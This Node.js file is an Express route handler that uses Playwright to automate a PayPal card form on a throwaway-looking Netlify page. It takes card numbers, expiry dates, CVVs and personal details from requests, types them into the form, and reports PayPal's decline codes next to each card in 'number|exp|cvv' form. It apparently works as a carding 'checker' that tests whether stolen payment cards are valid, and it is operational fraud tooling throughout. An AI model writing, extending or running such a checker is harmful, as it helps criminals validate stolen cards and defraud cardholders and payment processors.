const { chromium } = require("playwright");
const { isLuhnValid } = require("../helps/index.js");

const charges = (req, res) => {
  // console.log('body', req.body);
  async function CheckCard() {
    try {
      const {
        cardNumber,
        cardExpiry,
        cardCvv,
        firstName,
        lastName,
        email,
        country,
        phoneNumber,
        zipCode,
      } = req.body
      const isCardNumberValid = isLuhnValid(cardNumber);
      if (!isCardNumberValid) {
        return res.json({
          card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
          status: "INVALID_CARD_NUMBER",
          error: true,
        })
      }
      const browser = await chromium.launch({ headless: false, });
      const context = await browser.newContext();
      const page = await context.newPage();

      page.on('response', async response => {
        if (response.url().includes('https://www.paypal.com/graphql?fetch_credit_form_submit')) { // Ajusta la URL según tu API
          const data = await response.json(); // O response.text() si no es JSON
          if (data) {
            const cardError = data?.errors[0]?.data?.map(item => item.code)?.join(' - ');
            const message = data?.errors[0]?.message
            const result = {
              card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
              status: cardError,
              message: message,
              error: cardError ? true : null,
            }
            // console.log(result);
            await page.close();
            await browser.close();
            return res.json(result);
          } // Aquí tienes la respuesta del servidor
        }
        // console.log('de aqui',response.url());
      });

      await page.goto('https://striming-prime-basic-am.netlify.app/', {
        waitUntil: 'domcontentloaded'
      });
      await page.waitForTimeout(3000);
      // await page.keyboard.press('Tab');
      // await page.keyboard.press('Tab');
      await page.keyboard.press('Tab');
      await page.keyboard.press('Enter');
      await page.waitForTimeout(4000);
      await page.keyboard.press('Tab');
      await page.keyboard.press('Tab');
      // datos Card
      await page.keyboard.type(cardNumber, { delay: 100 });
      await page.waitForTimeout(1000);
      await page.keyboard.press('Tab');
      await page.keyboard.type(cardExpiry, { delay: 100 });
      await page.waitForTimeout(1000);
      await page.keyboard.press('Tab');
      await page.keyboard.type(cardCvv, { delay: 100 });
      await page.waitForTimeout(2000);
      // estos dos se quitan con targetas de usa
      // await page.keyboard.press('Tab');
      if (country?.currentKey !== 'usa') {
        await page.keyboard.press('Tab');
        await page.keyboard.press('Tab');
        await page.keyboard.press('Tab');
        await page.keyboard.type(country?.currentKey);
        await page.keyboard.press('Tab');
      }
      // if (country?.currentKey === 'usa') {
      //   await page.keyboard.press('Tab');
      //   await page.keyboard.press('Tab');
      //   await page.keyboard.press('Tab');
      //   await page.keyboard.press('Tab');
      // }
      // await page.keyboard.press('Tab');
      // await page.keyboard.press('Tab');
      await page.waitForTimeout(1000);
      await page.keyboard.type(firstName, { delay: 100 });
      await page.waitForTimeout(1000);
      await page.keyboard.press('Tab');
      await page.keyboard.type(lastName, { delay: 100 });
      await page.waitForTimeout(1000);
      await page.keyboard.press('Tab');
      await page.keyboard.type(zipCode, { delay: 100 });
      await page.waitForTimeout(1000);
      await page.keyboard.press('Tab');
      await page.keyboard.type(phoneNumber, { delay: 100 });
      await page.waitForTimeout(1000);
      await page.keyboard.press('Tab');
      await page.keyboard.type(email, { delay: 100 });
      await page.waitForTimeout(1000);
      if (country?.currentKey !== 'usa') {
        await page.keyboard.press('Tab');
        await page.keyboard.press('Space');
        await page.keyboard.press('Tab');
      }
      await page.keyboard.press('Tab');
      await page.keyboard.press('Enter');
      // esperar respuesta
      try {
        const response = await page.waitForResponse('https://www.paypal.com/graphql?fetch_credit_form_submit', { timeout: 5000 });
        // Manejar la respuesta aquí
        // console.log('response:', await response.json())
      } catch (error) {
        if (error?.name === "TimeoutError") {
          // console.error('La respuesta no llegó a tiempo.', error.name);
          await browser.close();
          return res.json({
            card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
            status: 'TimeoutError',
            error: true
          });
        } else {
          return
          // console.error('Error inesperado esperando response:', error);
        }
      }
    } catch (error) {
      console.log(error);
      await page.close();
      await browser.close();
      return res.status(500).send({
        card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
        status: "Ocurrio un error",
        error: true
      })
    }
  }
  return CheckCard();
};

module.exports = {
  charges,
}

